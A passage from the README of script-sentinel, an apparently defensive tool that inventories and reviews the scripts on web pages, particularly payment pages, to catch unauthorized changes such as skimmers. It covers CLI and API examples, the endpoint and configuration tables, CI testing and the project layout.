  ok       http://127.0.0.1:8000/checkout.html [payment]  200  7 scripts (1 new)
      headers: CSP report-only, nosniff, Referrer-Policy
      + http://127.0.0.1:8000/checkout.html#inline-3  (classic, pending)  sha384-FX8LLUZipr6QjrK…
        http://127.0.0.1:8000/checkout.html#inline-1  (classic, approved, nonce)  sha384-lXDOInm1aF5PqqU…
        http://127.0.0.1:8000/checkout.html#inline-2  (importmap, approved)  sha384-RK3hVJoVsFjKTgJ…
…
findings: 1 (review with: sentinel findings show ID)
  MEDIUM   4edbb921-7db9-4ccb-9dbe-727e59676e2a  New inline script on a payment page: http://127.0.0.1:8000/checkout.html#inline-3
           a new inline script; runs on a payment page
$ git checkout -- examples    # put the fixtures back
```

A script that appears on a page an earlier scan already inventoried is a finding (`low`
inline, `medium` external, `high` from a host no other script of the site uses, one level
up on a payment page). A page's first successful scan is its baseline, so registering a
new page doesn't flood the findings.

(Output from a real run against PostgreSQL 16.)

### The API

Or run the API (interactive docs at `http://127.0.0.1:8080/docs`):

```console
$ uv run sentinel serve --port 8080
$ curl -s -X POST localhost:8080/v1/sites -H 'content-type: application/json' \
    -d '{"name":"blog","allowed_origins":["https://Blog.Example.com:443/"],"scan_interval_hours":24}'
{
    "id": "98244174-12d9-4262-a0f9-2611ff60a33f",
    "name": "blog",
    "allowed_origins": [
        "https://blog.example.com"
    ],
    "scan_interval_hours": 24,
    "page_count": 0,
    "payment_page_count": 0,
    "created_at": "2026-11-21T09:59:34.947249Z",
    "updated_at": "2026-11-21T09:59:34.947257Z"
}
$ curl -s -X POST localhost:8080/v1/sites/blog/pages -H 'content-type: application/json' \
    -d '{"url":"https://evil.test/"}'
{"detail":"https://evil.test/ is not on an allowed origin of site 'blog' (https://blog.example.com)"}
```

Decisions and the audit trail work the same way over HTTP:

```console
$ curl -s -X POST localhost:8080/v1/sites/demo/scripts/$TAG_ID/approve \
    -H 'content-type: application/json' \
    -d '{"actor":"alice@example.com","justification":"Analytics vendor ships weekly; covered by contract","scope":"any_version"}' \
    | jq '{status, status_reason, decision, approval_scope, decided_by}'
{
  "status": "approved",
  "status_reason": "approved by alice@example.com for any version",
  "decision": "approved",
  "approval_scope": "any_version",
  "decided_by": "alice@example.com"
}
$ curl -s localhost:8080/v1/sites/demo/audit/verify | jq .
{
  "site": "demo",
  "ok": true,
  "events": 19,
  "head_hash": "d82e678d0e4e6c8b0898276c1b003d158e3a7742d47d23adc16c7cafb23a9b5a",
  "first_bad_seq": null,
  "problem": null
}
```

(Output above is from real runs against PostgreSQL 16; the JSON was pretty-printed.)

## API

| Method | Path | Purpose |
| --- | --- | --- |
| `GET` | `/healthz` | Liveness |
| `GET` | `/readyz` | Readiness (database ping); `503` when the database is unreachable |
| `POST` | `/v1/sites` | Register a site (`name`, `allowed_origins`, optional `scan_interval_hours`) |
| `GET` | `/v1/sites` | List sites with page counts |
| `GET` | `/v1/sites/{name}` | One site |
| `PATCH` | `/v1/sites/{name}` | Change origins or interval (`409` if a page would fall off the allowlist) |
| `DELETE` | `/v1/sites/{name}` | Delete a site and everything recorded for it |
| `POST` | `/v1/sites/{name}/pages` | Register a page (`422` if it's off the allowlist) |
| `GET` | `/v1/sites/{name}/pages` | List pages |
| `DELETE` | `/v1/sites/{name}/pages?url=…` | Stop scanning a page |
| `POST` | `/v1/sites/{name}/scans` | Scan every page now; returns the scan with each page's snapshot and scripts and the findings it raised (`422` if the site has no pages) |
| `GET` | `/v1/sites/{name}/scans?limit=20` | Recent scans, newest first |
| `GET` | `/v1/scans/{id}` | One scan with its snapshots and script observations |
| `GET` | `/v1/sites/{name}/scripts` | The site's script inventory with authorization status, version count and current SRI value |
| `GET` | `/v1/sites/{name}/scripts/{id}` | One script with its version history (hashes, SRI, size, first and last seen) |
| `GET` | `/v1/sites/{name}/scripts/{id}/versions/{version_id}/content` | One version's body, as `text/plain` with `nosniff` and a sandboxing CSP |
| `POST` | `/v1/sites/{name}/scripts/{id}/approve` | Approve (`actor`, `justification`, `scope`: `pinned` or `any_version`); `422` for a pinned approval with no fetched body |
| `POST` | `/v1/sites/{name}/scripts/{id}/reject` | Reject (`actor`, `reason`); overrides every policy |
| `POST` | `/v1/sites/{name}/scripts/{id}/reset` | Withdraw the decision (`actor`, `reason`); `409` if there is none |
| `GET` | `/v1/sites/{name}/policies` | The site's policies, oldest first |
| `POST` | `/v1/sites/{name}/policies` | Add a policy (`kind`, `match`, `change`, `ignore_query`, `justification`, `actor`); returns the scripts whose status changed (`409` for a duplicate) |
| `DELETE` | `/v1/sites/{name}/policies/{id}?actor=…&reason=…` | Remove a policy; returns the scripts whose status changed |
| `GET` | `/v1/sites/{name}/audit?script_id=…&limit=100` | The audit trail, newest first |
| `GET` | `/v1/sites/{name}/audit/verify` | Recompute the hash chain: `ok`, events verified, head hash, first bad event |
| `GET` | `/v1/sites/{name}/findings?status=…&min_severity=…&scan_id=…&script_id=…&limit=50` | Findings, newest first |
| `GET` | `/v1/findings/{id}` | One finding with its evidence (reasons, pages, diff hunks, size and entropy, new hosts and URLs) |
| `POST` | `/v1/findings/{id}/acknowledge` | Acknowledge (`actor`, optional `note`); audited |
| `POST` | `/v1/findings/{id}/resolve` | Resolve (`actor`, `note` required); audited |
| `POST` | `/v1/findings/{id}/reopen` | Reopen (`actor`, optional `note`); audited |
| `GET` | `/v1/sites/{name}/scripts/{id}/diff?from=…&to=…&max_hunks=200` | Token diff between two versions (id, hex SHA-384 prefix or SRI prefix); defaults to the latest two |

`PATCH /v1/sites/{name}` also accepts `respect_robots`. The `actor` on authorization and
finding requests is recorded as given: the API has no authentication yet (day 13 adds it),
so run it on a trusted network until then. A scan through the API runs inside the request
for now; scheduled background scans arrive with the worker on day 10.

## Configuration

| Variable | Default | Meaning |
| --- | --- | --- |
| `SENTINEL_DATABASE_URL` | `postgresql+asyncpg://sentinel:sentinel@localhost:5432/sentinel` | SQLAlchemy async URL (`postgresql+asyncpg://…` or `sqlite+aiosqlite:///…`) |
| `SENTINEL_DEFAULT_SCAN_INTERVAL_HOURS` | `168` | Interval for sites that don't set one (1–168) |
| `SENTINEL_LOG_LEVEL` | `info` | `debug`, `info`, `warning` or `error` |
| `SENTINEL_USER_AGENT` | `script-sentinel/<version> (+https://github.com/xeeshan16/script-sentinel)` | User-Agent for fetches; the part before the first `/` is the robots.txt product token |
| `SENTINEL_FETCH_TIMEOUT_SECONDS` | `10` | Deadline for one page, including redirects and robots.txt |
| `SENTINEL_MAX_PAGE_BYTES` | `2097152` | Larger pages are reported as `too_large` instead of parsed |
| `SENTINEL_MAX_SCRIPT_BYTES` | `5242880` | Larger external scripts are reported as `too_large` instead of hashed |
| `SENTINEL_MAX_REDIRECTS` | `5` | Redirect hops per page or script |
| `SENTINEL_SCAN_CONCURRENCY` | `4` | Pages fetched at once during a scan |
| `SENTINEL_ACTOR` | login name | Who the CLI records in the audit trail (`--actor` overrides it) |

The default URL's credentials are local-development placeholders; set your own in production.

## Development

```bash
uv sync
uv run ruff check . && uv run ruff format --check .
uv run mypy
uv run pytest --cov

# Also run the suite against PostgreSQL:
export SENTINEL_TEST_DATABASE_URL=postgresql+asyncpg://sentinel:sentinel@localhost:5432/sentinel
uv run pytest
```

CI runs the same checks on Python 3.12 and 3.13 against SQLite and PostgreSQL 16, builds the
package, smoke-tests the CLI and API against PostgreSQL, and scans the fixture site.

Scanner tests run against two real HTTP servers on `127.0.0.1` (the shop and a vendor CDN on
another origin) whose pages and scripts the tests change mid-run, plus `httpx.MockTransport`
for timeouts, oversized bodies, odd redirects and broken servers. No test touches the
internet. CI also authorizes the fixture inventory with policies and approvals, checks
that the payment-page gate passes, changes a vendor script in the fixture CDN, and checks
that it is recorded as a new version of the same script, sent back to review, fails the
gate and leaves an intact audit trail. Then it plants a synthetic skimmer in the vendor
script and checks for a `critical` finding with the new host in its diff, exit code 5 from
`--fail-on high`, the audited ack/resolve flow, and that an inline block inserted in front
of the others is one new script.

## Project layout

```
src/script_sentinel/
  app.py            FastAPI app factory, health checks, error mapping
  api/              REST routers and schemas
  cli.py            `sentinel` command line
  config.py         SENTINEL_* settings
  db/               engine, models, migration runner
  migrations/       Alembic environment and versions
  origins.py        origin parsing, normalization and allowlist matching
  sites.py          site and page registry with allowlist invariants
  fetch.py          page fetcher: timeouts, size caps, redirects, robots.txt
  robots.py         RFC 9309 robots.txt parsing and matching
  inventory.py      finds the scripts a browser would run on a page
  headers.py        captures a page's security-relevant response headers
  jstokens.py       JavaScript tokenizer and the normalized form used for hashing
  sri.py            Subresource Integrity values and browser-style checks
  versions.py       body hashing, per-script version history and version diffs
  diff.py           token diff (difflib for small changes, budgeted patience diff for big ones)
  changes.py        change analysis (size, entropy, referenced hosts), severity rules,
                    inline block matching
  findings.py       raising findings after a scan; acknowledge, resolve, reopen
  scanner.py        runs a scan and records snapshots, fetches, versions and the inventory
  authorization.py  decisions, policies and the rules that derive each script's status
  audit.py          the hash-chained, append-only authorization audit trail
examples/
  serve.py          serves the fixture shop and its CDN on two local origins
  fixture-site/     synthetic shop for the quick start and CI
  fixture-cdn/      the "third-party" scripts it loads
tests/              pytest suite (SQLite always, PostgreSQL when configured)
docs/               PLAN.md and PROGRESS.md
```

## License

[MIT](LICENSE) © 2026 Zeeshan Imdad
